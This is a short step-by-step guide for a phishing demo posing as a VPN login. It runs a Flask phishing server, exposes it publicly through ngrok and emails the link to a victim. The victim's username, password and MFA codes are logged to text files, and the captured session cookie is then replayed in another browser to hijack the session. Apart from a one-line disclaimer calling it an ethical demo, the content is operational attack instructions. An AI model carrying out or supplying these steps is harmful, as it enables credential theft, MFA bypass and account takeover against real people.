
=== Phishing VPN Demo Setup ===

Step 1: Install Flask if you haven't
    pip install flask

Step 2: Run the phishing server
    python3 phishing_vpn_demo.py

Step 3: Start ngrok to expose it publicly
    ngrok http 8080

Step 4: Send phishing link (e.g. https://xyz.ngrok.io/login) in email

Step 5: Victim enters:
    - Username + Password (logged in creds.txt)
    - MFA code (logged in mfa_codes.txt)

Step 6: Victim lands on /dashboard, which is protected only by session_token cookie.

You can manually inject the session_token in another browser to demonstrate session hijacking.

Note: This is for ethical demo/testing/educational use only.
